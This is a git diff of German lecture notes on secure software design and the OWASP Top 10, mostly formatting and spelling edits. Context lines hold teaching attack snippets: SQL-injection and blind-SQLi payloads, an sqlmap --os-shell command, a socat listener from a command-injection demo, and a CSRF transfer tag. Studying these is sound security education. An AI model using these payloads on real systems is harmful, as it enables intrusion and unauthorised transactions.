@@ -34,9 +34,9 @@ SPDX-License-Identifier: AGPL-3.0
 
 ### Was ist sichere Software?
 
-- Sichere Software ist Software, die gegen absichtliche Angriffe auf die Software geschützt ist
-- Jeder im Softwareentwicklungsprozess sollte an dieser Eigenschaft einer Software interessiert sein, da softare leider selten "automatisc" sicher ist.
-- Da Sicherheit durch die Abwesenheit von erfolgreichen Angriffen gegeben ist, muss die Software jedem möglichen Angriff standhalten können
+- Software die gegen absichtliche Angriffe geschützt ist
+- Software ist selten "automatisch" sicher
+- Software muss jedem möglichen Angriff standhalten können
 
 ### Was ist IT-Sicherheit?
 
@@ -89,9 +89,9 @@ Fehler können in allen Phasen des Entwicklungsprozesses auftreten (Anforderunge
 - Steigende Komplexität
 - Angriffe verlagern sich von klassicher IT auf rentablere Ziele e.g. Industrieanlagen, mobile Endgeräte, Botnetze oder Geldautomaten
 
-Kosten der Fehlerbehebung kostet im nach Produktionsauslieferung zwischen 30x-100x im Vergleich zu dem, was es beim Entwurf gekostet hätte
+Kosten der Fehlerbehebung kostet nach Produktionsauslieferung zwischen 30x-100x im Vergleich zu dem, was es beim Entwurf gekostet hätte.
 
-#### Sicherheitsbegriffe
+### Sicherheitsbegriffe
 
 **Bedrohung**
 
@@ -99,7 +99,7 @@ Kosten der Fehlerbehebung kostet im nach Produktionsauslieferung zwischen 30x-10
 
 **Schwachstelle/Sicherheitslücke**
 
-- Fehler, der zur Verleztung von Sicherheitskriterien (CIA) genutzt werden kann
+- Fehler, der zur Verletzung von Sicherheitskriterien (CIA) genutzt werden kann
 
 Ein **Fehler** führt zusammen mit einer **Bedrohung** zu einer **Schwachstelle**, die durch einen **Angriff** ausgenutzt werden kann
 
@@ -137,7 +137,7 @@ Ein **Fehler** führt zusammen mit einer **Bedrohung** zu einer **Schwachstelle*
   - CVSS (Common Vulnerability Scoring System)
   - DREAD
 
-**Fragen, die man sich beim erstellen eines Bewertungssystems fragen solle**
+**Fragen, die man sich beim erstellen eines Bewertungssystems fragen sollte**
 
 - Wie einfach ist die Schwachstelle zu lokalisieren?
 - Wie einfach ist sie auszunutzen?
@@ -154,16 +154,18 @@ IT-Sicherheit bewegt sich im Spannungsfeld von Funktionalität und Gebrauchstaug
 
 ### Fazit
 
-- IT-Systeme sind nur sicher, wenn alle Elemnte, die zum IT-System gehören, sicher sind
-- Empfohlenes Vorgehen: In alle Bereiche entsprechend des Risikos gezielt und moderat investieren, um die wichtigsten Tätigkeiten durchzuführen, anstatt das gesamte verfügbare Budget in einem Bereich auszugeben
+- IT-Systeme sind nur sicher, wenn alle Elemente, die zum IT-System gehören, sicher sind
+- **Empfohlenes Vorgehen**: In alle Bereichen entsprechend des Risikos gezielt und moderat investieren, um die wichtigsten Tätigkeiten durchzuführen, anstatt das gesamte verfügbare Budget in einem Bereich auszugeben
 
 ## Aufgabe 2: Thema sicherer Entwurf (3+1 = 4 Punkte)
+
+### Entwurfsprinzipien
 
 ![Entwurfsprinzipien](./static/entwurfsprinzipien.png)
 
 Manchmal stehen zwei oder mehr Entwurfsprinzipien in Konflikt zueinander. In diesem Fall muss man abwägen, welches im konkreten Fall das wichtigere Prinzip bei der Umsetzung ist. So kann es beispielsweise sinnvoll sein, "Einfachheit (Ökonomie des Mechanismus)" zu Gunsten von "Mehrstufige Verteidigung (Trennung von Privilegien)" zu opfern. Ein anderes Beispiel ist, dass kompliziertere Passwortanforderungen, die psychologische Akzeptanz behindern.
 
-**Minimierung der Angriffsfläche**
+#### Minimierung der Angriffsfläche
 
 - Prinzip
   - Dem Angreifer so wenig Angriffsfläche bieten, wie möglich
@@ -178,7 +180,7 @@ Manchmal stehen zwei oder mehr Entwurfsprinzipien in Konflikt zueinander. In die
   - Menge der Zugangspunkte und Schnittstellen zur Software minimieren
   - Rechte, mit denen der Programmcode laufen muss anpassen, sodass angreifer dadurch keine Vorteile oder Zugriffe auf andere Tools erhalten
 
-**Sichere Vorbelegung**
+#### Sichere Vorbelegung
 
 - Prinzip
   - Anwendungen sind so auszuliefern, dass sie möglichst sicher vorkonfiguriert sind
@@ -191,12 +193,12 @@ Manchmal stehen zwei oder mehr Entwurfsprinzipien in Konflikt zueinander. In die
     - Kann bei bedarf abgestellt werden
   - Firewall
     - Standardmäßig sind alle Ports geschlossen
-    - Notwendige Ports werden gezielt geöffnet
+    - Notwendige Ports werden geöffnet
 - Verwandte Prinzipien
   - "Prinzip des kleinsten Privilegs"
   - "Kleinster gemeinsamer Mechanismus"
 
-**Prinzip des kleinsten Privilegs**
+#### Prinzip des kleinsten Privilegs
 
 - Prinzip
   - Jede Funktion ist nur mit den minimal erforderlichen Rechten ausgestattet, unabhängig davon, ob sie intern ausgeführt wird oder aufgrund einer Benutzeranforderung
@@ -212,7 +214,7 @@ Manchmal stehen zwei oder mehr Entwurfsprinzipien in Konflikt zueinander. In die
   - "Minimierung der Angriffsfläche"
   - "Pflichtentrennung"
 
-**Prinzip der mehrstufigen Verteidigung**
+#### Prinzip der mehrstufigen Verteidigung
 
 - Prinzip
   - Es sind mehrere Sicherheitsmaßnahmen hintereinander zu verschiedenen Aspekten einzurichten
@@ -229,7 +231,7 @@ Manchmal stehen zwei oder mehr Entwurfsprinzipien in Konflikt zueinander. In die
 - Beispiel
   - Ein Fehler in der Administrationsoberfläche erlaubt nicht gleich Administratorzugang zur ganzen Anwendung, wenn Zugriffsberechtigungen für jeden Zugriff separat geprüft werden und außerdem noch alle Zugriffe protokolliert werden
 
-**Sicheres Verhalten bei Fehlern bzw. Ausnahmen**
+#### Sicheres Verhalten bei Fehlern bzw. Ausnahmen
 
 - Prinzip
   - Vertraulichkeit der Fehlermeldungen
@@ -252,17 +254,17 @@ Manchmal stehen zwei oder mehr Entwurfsprinzipien in Konflikt zueinander. In die
   - Anforderungskategorie "Ausnahmebehandlung"
   - "Sichere Vorbelegung"
 
-**Behandle externe Systeme als unsicher**
+#### Behandle externe Systeme als unsicher
 
 - Prinzip
   - Daten, die von externen Systemem kommen, sind zunächst einmal nicht vertrauenswürdig und müssen erst validiert werden, bevor sie verarbeitet oder dem Benutzer angezeigt werden.
 - Beispiel
   - Eine Online-Banking-Anwendung von Drittanwendung
-  - Internes System muss Daten von externem System auf sicherheit Prüfen (nicht-negativ, in den boundaries)
+  - Internes System muss Daten von externem System auf Sicherheit prüfen (e.g. nicht-negativ, in den boundaries)
 - Verwandtes Prinzip
   - "Zurückhaltung beim Vertrauen"
 
-**Pflichtentrennung**
+#### Pflichtentrennung
 
 - Prinzip
   - Mehrere Sicherheitsebenen verwenden, die sich idealerweise gegenseitig kontrollieren
@@ -276,7 +278,7 @@ Manchmal stehen zwei oder mehr Entwurfsprinzipien in Konflikt zueinander. In die
   - "Prinzip der mehrstufigen Verteidigung"
   - "Zurückhaltung beim Vertrauen"
 
-**Verlasse Dich nicht auf Sicherheit durch Verschleierung**
+#### Verlasse Dich nicht auf Sicherheit durch Verschleierung
 
 - Prinzip
   - Etwas geheim zu halten oder zu verstecken sollte nicht der einzige Sicherheitsmechanismus sein
@@ -286,7 +288,7 @@ Manchmal stehen zwei oder mehr Entwurfsprinzipien in Konflikt zueinander. In die
 - Verwandtes Prinzip:
   - "Offener Entwurf"
 
-**Einfachheit/KISS**
+#### Einfachheit/KISS
 
 - Prinzip
   - Einfache Programme bieten weniger Angriffsfläche, alleine schon deswegen, weil dadurch Programmierfehler weniger wahrscheinlich sind
@@ -298,7 +300,7 @@ Manchmal stehen zwei oder mehr Entwurfsprinzipien in Konflikt zueinander. In die
   - "Minimierung der Angriffsfläche"
   - "Ökonomie des Mechanismus"
 
-**Behebe Sicherheitslöcher richtig**
+#### Behebe Sicherheitslöcher richtig
 
 - Prinzip
   - Erst einen Testfall für die Sicherheitslücke erstellen und implementieren
@@ -311,11 +313,16 @@ Manchmal stehen zwei oder mehr Entwurfsprinzipien in Konflikt zueinander. In die
   - Online-Banking-Kunde kann durch veränderung des Cookies den Kontostand anderer Kunden sehen
   - Der Umgang mit Cookies wird auch in anderen Anwendungen in dieser Form eingesetzt, muss also auch verändert werden
 
-**Eingabevalidierung/Ausgabekodierung**
+#### Eingabevalidierung/Ausgabekodierung
 
-TODO: Add something here
+- Prinzip 
+  - Eingaben auf korrektheit prüfen 
+  - Ausgabe kontrollieren
+- Beispiel
+  - Angreifer kann Schadcode in Formularfeld einfügen, welcher dann auf einem anderen IT-System ausgeführt wird
+  - SQL-Injection
 
-**Sichere das schwächste Glied**
+#### Sichere das schwächste Glied
 
 - Prinzip
   - Sicherheitsmaßnahmen sollen zuerst dort angewendet werden, wo sie am meisten erforderlich sind, nicht dort wo sie bequem implementiert werden können
@@ -324,47 +331,47 @@ TODO: Add something here
 - Hinweis
   - Zuerst Bedrohungen adressieren, die im Rahmen der Bedrohungsmodellierung das höchste Risiko ergeben haben
 
-**Ökonomie des Mechanismus**
+#### Ökonomie des Mechanismus
 
 - Prinzip
   - Den Entwurf so einfach wie möglich halten
 - Verwandtes Prinzip
   - "Einfachheit"
 
-**Vollständige Vermittlung**
+#### Vollständige Vermittlung
 
 - Prinzip
   - Jeden Objektzugriff durch eine Berechtigungsprüfung absichern
 - Verwandte Prinzipien:
   - "Prinzip der mehrstufigen Verteidigung" (Defense in Depth)
 
-**Kleinster gemeinsamer Mechanismus**
+#### Kleinster gemeinsamer Mechanismus
 
 - Prinzip
-  - Minimierung der Anzahl der Mechanismes, die von Anwendern gemeinsam verwedet werden müssen
-  - Je mehr Mechanismes, desto größer ist die Wahrscheinlichkeit für falschen Einsatz und falsche Konfiguration bzw. Abstimmungslücken
+  - Minimierung der Anzahl der Mechanismen, die von Anwendern gemeinsam verwendet werden müssen
+  - Je mehr Mechanismen, desto größer ist die Wahrscheinlichkeit für falschen Einsatz und falsche Konfiguration bzw. Abstimmungslücken
 - Verwandtes Prinzip
   - "Minimierung der Angriffsfläche"
   - "Einfachheit"
 
-**Psychologische Akzeptanz**
+#### Psychologische Akzeptanz
 
 - Prinzip
   - Sicherheitsmechanismes dürfen die Verwendung der Software nicht gravierend beeinträchtigen
 - Beispiel
-  - Wenn zu viele Sicherheitsabfragen beantwortet werden müssen, dann werdendiese nicht mehr richtig gelesen und nicht mehr ernst genommen
+  - Wenn zu viele Sicherheitsabfragen beantwortet werden müssen, dann werden diese nicht mehr richtig gelesen und nicht mehr ernst genommen
     - Alle Sicherheitsabfragen werden akzeptiert, d.h. mit "weiter" beantwortet ohne den Text zu lesen
     - Sicherheitsabfragen werden generell abgeschaltet
 
-**Zurückhaltung bei Vertrauen**
+#### Zurückhaltung bei Vertrauen
 
 - Prinzip
-  - Alle Daten, die von außen kommen, sind zu misstrauen
+  - Allen Daten, die von außen kommen, ist zu misstrauen
 - Verwandte Prinzipien
   - "Behandle externe Systeme als unsicher"
   - "Pflichtentrennung"
 
-**Schutz der Privatssphäre**
+#### Schutz der Privatssphäre
 
 - Prinzip: Schütze die Daten der Anwender
 - Rechtliche Grundlagen (Datenschutzgrundverordnung, Bundesdatenschutzgesetz, Landesdatenschutzgesetz)
@@ -372,7 +379,7 @@ TODO: Add something here
   - Verarbeitung von personenbezogenen Daten grundsätzlich verboten
   - Ausnahme: Für legitimen Zweck (Vertrag oder Gesetz)
 
-**Offener Entwurf**
+#### Offener Entwurf
 
 - Prinzip
   - Sicherheit sollte nicht ausschließlich auf der Gerheimhaltung des Entwurfs beruhen
@@ -390,13 +397,12 @@ TODO: Add something here
 
 ### Anwendung des Beispiels auf STRIDE
 
-- **Spoofing Identity** -> kann mit AuthN verhindert werden
-- **Tampering Information** -> physisches Beispiel schwer anwendbar. Es könnte jemand anderes auf Unterschrieben haben, wodurch man eventuell Informationen über einen anderen Account erhält. Digital wäre das mit einer SQL-Injection vergleichbar
-- **Repudiation** -> keine Gegenmaßnahmen, wir bräuchten Logging ins Audit-Log (Man kommt jeden Tag in die Filiale und versucht mit gefälschtem Ausweis AuthN zu umgehen) -> Wir können nicht sagen, dass diese Person schon versucht hat das System zu umgehen. Auch bei AuthZ wird nicht geprüft wie viele invalide withdrawal-Anfragen schon gestellt wurden -> bräuchten wieder Logging ins Audit-Log
-- In beiden Fällen ist die Kante ins Audit-Log Rot-Grün (Orange), da ein Teil des Logs vertrauenswürdig ist (AuthN, AuthZ), und Teile nicht (Withdrawal Request, Identification Data)
-- **Information Disclosure** -> Kunde bekommt keine Informationen, außer ob er Geld bekommt oder nicht
-- **Denial of Service** -> Online IP-Sperren oder Banbreitebegrenzung, Analog halten sehr alte Leute oft den Verkehr auf. Analog könnte man gegen diese Attacken vorgehen, indem man ein Wartezimmer einfügt
-- **Elevation of Priviledges** -> Man hätte nur die Privilegien, wenn man es schafft sich als jemand anderes auszugeben. AuthN und AuthZ sind die Gegenmaßnahmen, die unser System dagegen bietet
+- **Spoofing Identity** kann mit AuthN verhindert werden
+- **Tampering Information** ist auf physisches Beispiel schwer anwendbar. Es könnte jemand anderes unterschrieben haben, wodurch man eventuell Informationen über einen anderen Account erhält. Digital wäre das mit einer SQL-Injection vergleichbar
+- **Repudiation** wird in diesem Beispiel nicht verhindert. Wir bräuchten Logging ins Audit-Log (Man kommt jeden Tag in die Filiale und versucht mit gefälschtem Ausweis AuthN zu umgehen). Wir können nicht sagen, dass diese Person schon versucht hat das System zu umgehen. Auch bei AuthZ wird nicht geprüft wie viele invalide withdrawal-Anfragen schon gestellt wurden. Auch hier bräuchten wir wieder Logging ins Audit-Log. In beiden Fällen ist die Kante ins Audit-Log Rot-Grün (Orange), da ein Teil des Logs vertrauenswürdig ist (AuthN, AuthZ), und Teile nicht (Withdrawal Request, Identification Data)
+- **Information Disclosure** wird hier gut gehandhabt. Kunde bekommt keine Informationen, außer ob er Geld bekommt oder nicht
+- **Denial of Service** kann Online durch IP-Sperren oder Banbreitenbegrenzung verhindert werden. Analog halten sehr alte Leute oft den Verkehr auf. In diesem Fall könnte man gegen diese "Attacke" vorgehen, indem man ein Wartezimmer einfügt
+- **Elevation of Priviledges** wird hier weitesgehend verhindert. Man hätte nur die Privilegien, wenn man es schafft sich als jemand anderes auszugeben. AuthN und AuthZ sind die Gegenmaßnahmen, die unser System dagegen bietet
 
 ## Aufgabe 3: Penetration Test: Buffer Overflow (10 Punkte)
 
@@ -768,17 +774,17 @@ if __name__ == "__main__":
 
 ### Evaluation verschiedener Schutzmechanismen
 
-Firewalls verhindern keine Angriffe über erlaubte Ports
+**Firewalls** verhindern keine Angriffe über erlaubte Ports
 
-Beispiel: - Angriffe gegen eine Web-Anwendung über das HTTP-Protokoll und TCP-Ports 80/443
+Beispiel: Angriffe gegen eine Web-Anwendung über das HTTP-Protokoll und TCP-Ports 80/443
 
-Verschlüsselung sichert Integrität der übertragenen Daten, damit werden aber auch Angriffe "sicher" zum Zielsystem übertragen
+**Verschlüsselung** sichert Integrität der übertragenen Daten, damit werden aber auch Angriffe "sicher" zum Zielsystem übertragen
 
-Beispiel: - Verhindern keine Angriffe gegen Serversysteme auf Anwendungsebene
+Beispiel: Verhindern keine Angriffe gegen Serversysteme auf Anwendungsebene
 
-Frameworks vermeiden Schwachstellen, da sie gut getestet sind, aber sind ein Risiko für den Datenschutz und können Fehler über dependencies einschleusen
+**Frameworks** vermeiden Schwachstellen, da sie gut getestet sind, aber sind ein Risiko für den Datenschutz und können Fehler über dependencies einschleusen
 
-Beispiel: - Wenn über CDNs eingebunden wird jeder Aufruf beim Anbieter protokolliert - Laden viele Pakete nach
+Beispiel: Wenn über CDNs eingebunden wird jeder Aufruf beim Anbieter protokolliert - Laden viele Pakete nach
 
 ### Angriffsziele
 
@@ -787,30 +793,30 @@ Beispiel: - Wenn über CDNs eingebunden wird jeder Aufruf beim Anbieter protokol
 - Betriebssysteme, e.g. Windows, Linux
 - Netzwerk, e.g. ARP, IP, TCP, UDP
 
-### OWASP Top 10
+### OWASP Top 10 Übersicht
 
 ![OWASP Top 10](./static/owasp.png)
 
 ### A1: Fehlerhafte Berechtigungsprüfung
 
-- Prüfung von Zugriffsberechtigungen fehlt oder ist fehlerhaft
-- Beispiele
+- **Prüfung** von Zugriffsberechtigungen fehlt oder ist **fehlerhaft**
+- **Beispiele**
   - Verletzung des Prinzips des kleinsten Privilegs bzw. der Zugriffsverweigeruns als Standardeinstellung
   - Umgehen der Berechtigungsprüfung durch verändern der URL
-  - Unsichere direkte Objectreferenz
+  - Unsichere direkte Objektreferenz
   - Zugriff auf eine API ohne POST PUT und DELETE Berechtigungsprüfung
   - Erweiterung der Rechte
     - Zugriff als normaler Benutzer möglich, ohne am System angemeldet zu sein
   - Manipulation von Metadaten wie e.g. erneutes Senden JWT Access Control Tokens, eines Cookies oder eines versteckten Formularfeldes
   - Fehlerkonfiguration von CORS
-- Auswirkungen
-  - Angreifer hat mehr Rechte, als ihnen eigentlich zustehen würden
+- **Auswirkungen**
+  - Angreifer haben mehr Rechte, als ihnen eigentlich zustehen würden
   - Offenlegung von Informationen
-- Angriffsszenario: Unsichere direkte Objektreferenz
+- **Angriffsszenario** (Unsichere direkte Objektreferenz)
   - Bedrohung: Benutzer kann den Namen oder die ID eines Objektes verwenden um direkten Zugriff zu erhalten, ohne dass die Berechtigungen des Benutzers überprüft werden
-  - Ursachen: Fehlende Berechtigungsprüfung für alle Objektzugriffe
+  - Ursachen: Fehlende Berechtigungsprüfung für alle Objektzugriffe (Entwurfsprinzip der "Vollständigen Vermittlung")
   - Verwendung direkter Referenzen auf Objekte
-- Beispiel:
+- **Beispiel**
   ```java
   String query = "SELECT * FROM accts WHERE account = ?";
   PreparedStatement pstmt = connection.preparedStatement(query, ...);
@@ -821,7 +827,7 @@ Beispiel: - Wenn über CDNs eingebunden wird jeder Aufruf beim Anbieter protokol
   ```
   https://example.com/app/accountInfo?acct=notmyacct
   ```
-- Maßnahmen
+- **Maßnahmen**
   - Berechtigungsprüfung ist nur effektiv, wenn diese in vertrauenswürdigem Kontext durchgeführt wird, in welchem die Metadaten von Angreifern nicht modifiziert werden kann
   - Standardmäßig Zugriff verbieten
   - Verwendung inderekter Referenzen
@@ -839,28 +845,28 @@ Beispiel: - Wenn über CDNs eingebunden wird jeder Aufruf beim Anbieter protokol
 
 ### A2: Fehlerhafte Kryptographie
 
-- Es werden keine kryptographische Verfahren verwendet
-- Es werden fehlerhafte, schwache oder nicht mehr sichere kryptographische Verfahren oder Implementierung verwendet
-- Beispiel
-  - HTTP, FTP, telnet
-  - DES, 3DES
+- Es werden **keine kryptographische Verfahren** verwendet
+- Es werden **fehlerhafte**, **schwache** oder nicht mehr sichere **kryptographische Verfahren** oder Implementierung verwendet
+- **Beispiel**
+  - **HTTP**, **FTP**, telnet
+  - **DES**, 3DES
   - Passwörter im Klartext speichern
-- Was wird angegriffen?
+- **Was wird angegriffen?**
   - Passwörter
   - Schlüssel
   - Session IDs
-- Angriffspunkte
+- **Angriffspunkte**
   - Festplatten
   - Hauptspeicher
   - Übertragung im Netzwerk
-- Angegriffene Anwendungen
+- **Angegriffene Anwendungen**
   - Datenbanken
   - Browser
-- Angriffsszenarien: Beispiele
+- **Angriffsszenarien**
   - Kreditkartennummer werden in einer Datenbank verschlüsselt gespeichert
   - Angreifer können die Kreditkartennummern dann durch eine SQL-Injektion direkt im Klartext aus der Datenbank abfragen
-  - Eine Web-Anwendung erzwingt die Verwendung von TLS NICHT
-- Maßnahmen
+  - Eine Web-Anwendung erzwingt die Verwendung von TLS **nicht** 
+- **Maßnahmen**
   - Schutzbedarf der zu speichernden ermitteln
   - Klassifizieren nach Sensibilität
   - Sensible Daten nicht unnötig speichern
@@ -872,23 +878,20 @@ Beispiel: - Wenn über CDNs eingebunden wird jeder Aufruf beim Anbieter protokol
 ### A3: Injektionen
 
 - Eine Anwendung ist verwundbar gegen eine Injektionsangriff, wenn sie
-  - Daten, die von Benutzern geliefert werden, nicht validiert, filtert oder bereinigt
+  - Daten, die von Benutzern geliefert werden, **nicht validiert**, filtert oder bereinigt
   - Direkt interpretierte statements ohne "escaped" zu werden
   - Feindselige Daten in den Suchparametern von ORM verwendet
   - Feindselige Daten diret verwendet oder verkettet
-- Bedrohung
-  - Angreifer manipulieren Anfragen, um unerwünschte Aktionen durchzuführen, Informationen zu gewinnen oder Daten zu manipulieren
-- Hauptursache
+- **Bedrohung**
+  - Angreifer **manipulieren Anfragen**, um unerwünschte Aktionen durchzuführen, Informationen zu gewinnen oder Daten zu manipulieren
+- **Hauptursache**
   - Anwendung übernimmt Benutzereingaben ohne Validierung, Filterung oder Bereinigung
-- Auswirkung
+- **Auswirkung**
   - Auslesen und Manipulation von Datenbankinhalten
   - Umgehen der Authentifizierung
   - Vollständige Kompromittierung des Systems
 
 #### SQL-Injection
-
-TODO: Add DVWA Code examples
-TODO: Add Countermeasures + Additional Information from slides
 
 **Example: Admin-Login**
 
@@ -972,9 +975,9 @@ http://site.com/accountView?id=' or '1'='1
 
 #### Blind SQL-Injection
 
-- Bei Blind SQL-Injections bekommt man keine Fehlermeldungen angezeigt
+- Bei Blind SQL-Injections bekommt man **keine Fehlermeldungen** angezeigt
 - Lediglich zwei Zustände können anhand der Ergebnisseite unterschieden werden
-- Erzeugen von Wahr/Falschaussagen
+- **Erzeugen von Wahr/Falschaussagen**
   ```
   WHERE id='$id' and ASCII(SUBSTRING(SYSTEM_USER,1,1)) = 65
   ```
@@ -1012,7 +1015,7 @@ sqlmap -u http://192.168.1.42/aktion.php?4711 --dbms=mysql --os-shell
 
 **Typisches Vorgehen**
 
-- Request mit BURP-Suite abfangen und in Datei speichern
+- Request mit BURP-Suite abfangen und in Datei abspeichern
 
 #### SQL-Injection-Demos
 
@@ -1090,7 +1093,7 @@ Escape String but not having quotes around parameter
 
 #### Command Injection
 
-Einschleusen von Befehlen, die direkt vom Betriebssystem verarbeitet werden.
+Einschleusen von **Befehlen**, die **direkt** vom Betriebssystem **verarbeitet** werden.
 
 Um zu prüfen, welche der Anwendungen installiert ist, kann `which` verwendet werden e.g. `which socat`.
 
@@ -1110,11 +1113,11 @@ socat -dd TCP4-LISTEN:4443 STDOUT # Listener
 
 #### Cross-Site Scripting (XSS)
 
-Einschleusen von "schadhaftem" Skriptcode in den Browser des Opfers. Charakteristisch ist, dass der Schadcode im Kontext und mit Zugriffsrechten des Opfers ausgeführt wird.
+**Einschleusen** von "schadhaftem" **Skriptcode** in den Browser des Opfers. Charakteristisch ist, dass der Schadcode im Kontext und mit Zugriffsrechten des Opfers ausgeführt wird.
 
 **Reflektiertes XSS**
 
-Benutzereingabe wird vom Server direkt zurückgegeben e.g. Suchergebnisse (Ihre Suche war: <Suche>)
+Benutzereingabe wird vom Server direkt zurückgegeben 
 
 - Skriptcode wird im Browser des Opfers interpretiert
 
@@ -1215,15 +1218,15 @@ Ergebnis:
 
 #### Gegenmaßnahmen
 
-- Client- und Server-seitige Eingabevalidierung
+- Client- und Server-seitige **Eingabevalidierung**
   - Prüfe alle Eingabedaten bevor sie zur Speicherung akzeptiert oder angezeigt werden
   - Prüfung auf Länge, Typ, Wertebereich, Syntax oder Geschäftsregeln
   - Verwende Positivliste bei der Eingabeprüfung "akzeptiere nur als gutartig bekannte Daten"
-- Ziehe die Positivliste (white list) immer der Negativliste (black list) vor
-- Ausgabekodierung
+- Ziehe die **Positivliste** (white list) immer der Negativliste (black list) vor
+- **Ausgabekodierung**
   - Stelle sicher, dass alle Benutzereingaben als HTML- oder XML-Entitäten kodiert sind, bevor diese ausgegeben bzw. gerendert werden
-  - Die meisten Frameworks stelen Methoden zur Ausgabekodierung zur Verfügung (php hat `htmlspecialchars()` oder `htmlentities()`)
-- Content Security Policy, teilt dem Browser mit, welche Domains er als Quelle von vertrauenswürdigem JavaScript-Code akzeptieren soll
+  - Die meisten Frameworks stellen Methoden zur Ausgabekodierung zur Verfügung (php hat `htmlspecialchars()` oder `htmlentities()`)
+- **Content-Security-Policy**, teilt dem Browser mit, welche Domains er als Quelle von vertrauenswürdigem JavaScript-Code akzeptieren soll
   - Verstöße werden in der Browser-Konsole gemeldet
   - Ist CSP aktiv, wird in HTML-Dokumenten eingebetteter JavaScript-Code standardmäßig nicht mehr ausgeführt
   - Deaktiviert standardmäßig auch die `eval()` Funktion von JavaScript
@@ -1234,31 +1237,32 @@ Script mit Positivliste gegen lokales XSS
 
 ```
 <script>
-var pos=document.URL.indexOf("name=")+5;
-var name=document.URL.substring(pos,
-document.URL.length);
-if (name.match(/^[a-zA-Z0-9]$/)) {
-document.write(name);
-}
-else {
-window.alert("Security error");
-}
+	var pos=document.URL.indexOf("name=")+5;
+	var name=document.URL.substring(pos, document.URL.length);
+	if (name.match(/^[a-zA-Z0-9]$/)) {
+		document.write(name);
+	} else {
+		window.alert("Security error");
+	}
 </script>
 ```
 
 #### Cross-Site-Request-Forgery
 
-- Ersetzen in einer Referenz in einem HTML-Dokument durch Referenz auf eine andere Web-Seite
-- Ein CSRF-Angriff zwingt den Browser eines Opfers, das sich korrekt authentifiziert hat, dazu, einen Request an eine verwundbare Webanwendung zu schicken, die dann die vom Angreifer gewünschte Aktion im Namen des Opfers ausführt
-- Beispiel
-  `<img src="http://www.example.com/transfer.do? frmAcct=document.form.frmAcct&toAcct=4345754& toSWIFTid=434343&amt=3434.43">`
+- **Ersetzen** in einer **Referenz** in einem HTML-Dokument durch **Referenz** auf eine **andere Web-Seite**
+- Ein CSRF-Angriff **zwingt** den **Browser** eines Opfers, das sich korrekt authentifiziert hat, dazu, einen **Request an eine verwundbare Webanwendung** zu schicken, die dann die vom Angreifer **gewünschte Aktion im Namen des Opfers ausführt**
+- **Beispiel**
+  ```html
+  <img src="http://www.example.com/transfer.do? frmAcct=document.form.frmAcct&toAcct=4345754& toSWIFTid=434343&amt=3434.43">
+  ```
   Oben stehendes Tag kann auf Seite des Angreifers stehen und ist
   erfolgreich, wenn der Browser des Benutzers noch für das Online-
   Banking authentifiziert ist.
 
-Hauptursache: - Browser sendet Berechtigungen in Form von Cookies mit - werden durch XSS begünstigt
+**Hauptursache**
+ - Browser sendet Berechtigungen in Form von Cookies mit - werden durch XSS begünstigt
 
-Gegenmaßnahmen:
+**Gegenmaßnahmen**
 
 - Generieren von nicht vorhersagbaren Autorisierungstokens, welche nicht automatisch mitgesendet werden
 - Anschließend verifizieren, dass die abgeschickten Werte für Name und Wert für den aktuellen Benutzer korrekt sind
@@ -1270,64 +1274,73 @@ Gegenmaßnahmen:
 
 Der Entwurf berücksichtigt die Risiken für die zu entwickelnde Software nicht angemessen im Kontext des Geschäftsumfelds, der Anwendungsfalls, der Einsatzumgebung etc.
 
-Konsequenz: - Notwendige Sicherheitsmaßnahmen sind nicht im Entwurf enthalten und werden dementsprechend auch nicht implementiert
+**Konsequenz**
+- Notwendige Sicherheitsmaßnahmen sind nicht im Entwurf enthalten und werden dementsprechend auch nicht implementiert
 
-Anmerkungen: - Sicherer Entwurf kann durch Fehler in der Implementierung trotzdem zu Schwachstellen führen - Ein unsicherer Entwurf lässt sich selbst durch eine perfekte Implementierung nicht reparieren
+**Anmerkungen**
+- Sicherer Entwurf kann durch Fehler in der Implementierung trotzdem zu Schwachstellen führen 
+- Ein unsicherer Entwurf lässt sich selbst durch eine perfekte Implementierung nicht reparieren
 
-Angriffsszenarien:
+**Angriffsszenarien**
 
-- Schwachstelle im Entwurf
-  - Einrichten neuer Zugriffsdaten erfolgt über zuvor hinterlegte Sicherheitsfragen
-- Angriff
-  - Social Engineering zum Ausfragen der Person, um die Personen zu erfragen
-- Problem
+- **Schwachstelle** im Entwurf
+  - Einrichten neuer Zugriffsdaten erfolgt über zuvor hinterlegte **Sicherheitsfragen**
+- **Angriff**
+  - **Social Engineering** zum Ausfragen der Person, um die Personen zu erfragen
+- **Problem**
   - Derartige Fragen und Antworten sind kein vertrauenswürdiger Nachweis für die Identität einer Person
-- Anmerkung
-
+- **Anmerkung**
   - Solche Sicherheitsfragen sind durch Standards- und De-Facto-Standards auch verboten
-
-- Schwachtstelle im Entwurf
+- **Schwachtstelle** im Entwurf
   - Es wurde nicht an Schutz vor Bots gedacht, d.h. die Anzahl an Transaktionen in einem kurzen Zeitraum wurde nicht begrenzt
-- Angriff
-  - Bots kaufen und verkaufen für mehr (Sculper)
-- Konsequenzen
+- **Angriff**
+  - Bots kaufen und verkaufen für mehr (scalpers)
+- **Konsequenzen**
   - Rufschädigung
   - Echte Käufer verärgert
 
 #### Gegenmaßnahmen
 
-- Anforderungen und Ressourcesverwaltung
-  - Anforderungen einsammeln und besprehcen
-  - Einbeziehen von Sicherheitsanforderungen
+- Anforderungen und Ressourcenverwaltung
+  - Anforderungen einsammeln und besprechen
+  - Einbeziehen von **Sicherheitsanforderungen**
   - Berücksichtigen, wie einfach die Anwendung zugreifbar ist
-  - Budget für alle Phasen einplanen
+  - **Budget** für alle Phasen **einplanen**
 - Sicherer Entwurf
-  - Permanente Evaluation
-  - Integrieren von Bedrohungsmodellierung
+  - **Permanente Evaluation**
+  - Integrieren von **Bedrohungsmodellierung**
   - Fehlerzustände in User Stories festlegen
 - Sicherer Software-Entwicklungszyklus
   - Bedrohungsmodullierung
   - Sichere Entwurfsmuster
-  - Bibliotheken mit sicheren Komponenten
-  - Sicherheitsexperten in allen Phasen eingebunden
+  - **Bibliotheken mit sicheren Komponenten**
+  - **Sicherheitsexperten** in allen Phasen eingebunden
   - Hilfestellung durch OWASP Software Assurance Maturity Model (SAMM)
 - Implementierung
   - Plausibilitätsprüfungen einbauen
-  - Unit- und Integrationtests
-  - Schichtentrennung
+  - **Unit- und Integrationtests**
+  - **Schichtentrennung**
   - Mandaten trennen
   - Begrenzung des Ressourcenverbauchs durch Benutzer und Dienste
 
 ### A5: Fehlerhafte Sicherheitskonfiguration
 
-Konfigurationseinstellungen können zu Sicherheitslücken führen
+**Konfigurationseinstellungen** können zu Sicherheitslücken führen
 
